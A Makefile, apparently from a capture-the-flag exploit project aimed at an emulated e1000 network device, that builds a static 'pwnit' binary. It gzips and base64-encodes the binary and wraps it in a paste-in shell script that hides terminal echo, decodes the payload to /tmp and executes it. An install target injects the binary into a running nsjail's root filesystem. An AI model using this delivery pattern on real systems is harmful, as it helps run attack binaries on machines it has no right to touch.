.PHONY: clibpoard
clipboard: pwnit.sh
	xclip -selection c <pwnit.sh

pwnit.sh: pwnit.gz.b64
	(echo 'stty -echo' && echo 'rm -f /tmp/pwnit && base64 -d <<HERE | gzip -d >/tmp/pwnit && chmod a+x /tmp/pwnit && /tmp/pwnit' && cat pwnit.gz.b64 && echo 'HERE') >pwnit.sh

pwnit.gz.b64: pwnit.gz
	base64 <pwnit.gz >pwnit.gz.b64

pwnit.gz: pwnit
	gzip -9 <pwnit >pwnit.gz

pwnit: pwnit.c e1000_regs.h e1000x_regs.h mii.h
	musl-gcc -I. -o pwnit -static -pthread -Os -Wall -Wextra -Werror -isystem. pwnit.c -I.

.PHONY: install
install: pwnit pwnit2cpio
	cp app/rootfs.cpio all.cpio
	./pwnit2cpio <pwnit >>all.cpio
	sudo cp all.cpio /proc/$(shell pidof nsjail)/root/srv/app/rootfs.cpio

.PHONY: fmt
fmt:
	clang-format -i pwnit.c
